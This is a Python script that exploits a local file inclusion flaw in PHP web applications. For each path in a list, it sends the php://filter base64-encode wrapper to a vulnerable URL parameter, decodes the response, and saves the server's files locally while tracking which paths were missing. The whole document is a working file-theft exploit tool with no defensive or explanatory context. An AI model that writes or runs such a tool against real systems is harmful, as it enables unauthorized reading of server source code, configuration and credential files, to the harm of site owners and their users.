# Dirty script to fetch files through LFI
# files.txt - contains files to fetch
# filesmissing.txt - list of files which have been tried, but not found
# No double downloads -> add file to files.txt and rerun.

import requests
import time
import StringIO
import urllib
import uu
import base64
import os.path
import argparse

parser = argparse.ArgumentParser(description='Abuse LFI through PHP filters')
parser.add_argument('url', type=str, help='URL including the vulnerable parameter at the end')
parser.add_argument('begin', type=str, default="[(")
parser.add_argument('end', type=str, default=")]")
args = parser.parse_args()

files = set()
with open('files.txt') as f:
    for line in f:
      if (line[0] != "#"):
        files.add(line.rstrip(' ').rstrip('\n'))

missingfiles = set()
with open('filesmissing.txt') as f:
    for line in f:
      missingfiles.add(line.rstrip('\n'))

print(files)
print("\n-----")
files = files.difference(missingfiles)

print(files)
print("\n-----")
print(missingfiles)

#exit(0)

def uu2string(data, mode=None):
    outfile = StringIO.StringIO()
    infile = StringIO.StringIO(data)
    uu.decode(infile, outfile, mode)
    return outfile.getvalue()

print('------')


count = 0
for lfi in files:
    print("Still trying.. " + lfi)
    time.sleep(0.05)
    fn = lfi.replace("/", ".").replace("..","-") + ".FOO"
    if (not (os.path.isfile(fn))):  
      repla = requests.get(args.url + "php://filter/read=convert.base64-encode/resource=" + urllib.quote_plus(lfi))
      if (repla.status_code == 200):
        base64encoded = repla.text.split(args.begin)[1]
        base64encoded = base64encoded.split(args.end)[0]
        print("FILE : " + lfi)
        content=base64.b64decode(base64encoded)
        print(content)
        with open(fn, "w") as f:
          f.write(content)
        print("---------------")
      else:
        print("STATUS : " + str(repla.status_code))
        if (repla.status_code == 500):
          missingfiles.add(lfi)
    count = count + 1

with open("filesmissing.txt", "w") as f:
  for l in missingfiles:
    f.write(l+"\n")

